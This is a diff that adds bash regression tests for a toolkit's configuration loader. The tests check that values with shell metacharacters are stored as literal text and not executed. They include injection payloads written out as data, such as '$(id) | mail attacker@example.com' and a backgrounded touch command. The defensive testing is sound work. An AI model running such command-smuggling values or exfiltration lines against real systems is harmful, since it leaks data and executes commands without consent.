@@ -3100,6 +3100,66 @@ else
     bad "a \$(...) payload was not preserved as literal text (got '$literal')"
 fi
 rm -f /tmp/config-pwned /tmp/config-pwned-backtick /tmp/config-pwned-semicolon
+
+echo "== configuration engine: pipe and background-execution payloads are never executed =="
+mkdir -p "${CFG_TMP}/pipeamp"
+PWNED_BG="${CFG_TMP}/pipeamp/pwned-bg"
+{
+    printf 'EVIL_PIPE=$(id) | mail attacker@example.com\n'
+    printf 'EVIL_BG=touch %s &\n' "$PWNED_BG"
+} > "${CFG_TMP}/pipeamp/config"
+chmod 600 "${CFG_TMP}/pipeamp/config"
+literal_pipe="$(TOOLKIT_CONFIG_DIR="${CFG_TMP}/pipeamp" bash -c '
+    source "'"${LIB_DIR}"'/config.sh"
+    config_get EVIL_PIPE "" string
+' 2>/dev/null)"
+TOOLKIT_CONFIG_DIR="${CFG_TMP}/pipeamp" bash -c '
+    source "'"${LIB_DIR}"'/config.sh"
+    config_get EVIL_BG "" string
+' >/dev/null 2>&1
+if [[ ! -e "$PWNED_BG" ]]; then
+    ok "config loader never executes shell payloads embedded in values (|, &)"
+else
+    bad "SECURITY: a config value containing | or & was executed as a shell command (found: $PWNED_BG)"
+fi
+if [[ "$literal_pipe" == '$(id) | mail attacker@example.com' ]]; then
+    ok "a value containing | and \$(...) is stored and returned as inert literal text, not executed"
+else
+    bad "a pipe/subshell payload was not preserved as literal text (got '$literal_pipe')"
+fi
+
+echo "== configuration engine: a value containing a literal tab survives the parser's own KEY<TAB>VALUE delimiter =="
+mkdir -p "${CFG_TMP}/tabtest"
+printf 'TABTEST=a\tb\n' > "${CFG_TMP}/tabtest/config"
+chmod 600 "${CFG_TMP}/tabtest/config"
+result="$(TOOLKIT_CONFIG_DIR="${CFG_TMP}/tabtest" bash -c '
+    source "'"${LIB_DIR}"'/config.sh"
+    config_get TABTEST "" string
+' 2>/dev/null)"
+if [[ "$result" == $'a\tb' ]]; then
+    ok "a value containing a literal tab character round-trips intact (delimiter collision handled correctly)"
+else
+    bad "a value containing a literal tab was not preserved intact (got '$(printf '%q' "$result")')"
+fi
+
+echo "== configuration engine: an unterminated quote does not span lines (pinned, known limitation) =="
+mkdir -p "${CFG_TMP}/multiline"
+printf 'FOO="bar\nKEY2=malicious"\n' > "${CFG_TMP}/multiline/config"
+chmod 600 "${CFG_TMP}/multiline/config"
+result_foo="$(TOOLKIT_CONFIG_DIR="${CFG_TMP}/multiline" bash -c '
+    source "'"${LIB_DIR}"'/config.sh"
+    config_get FOO "" string
+' 2>/dev/null)"
+result_key2="$(TOOLKIT_CONFIG_DIR="${CFG_TMP}/multiline" bash -c '
+    source "'"${LIB_DIR}"'/config.sh"
+    config_get KEY2 "" string
+' 2>/dev/null)"
+if [[ "$result_foo" == '"bar' && "$result_key2" == 'malicious"' ]]; then
+    ok "an unterminated quote does not span lines: FOO and KEY2 parse as two separate inert values"
+else
+    bad "unterminated-quote multi-line handling changed unexpectedly (FOO='$result_foo', KEY2='$result_key2')"
+fi
+
 rm -rf "$CFG_TMP"
 
 echo
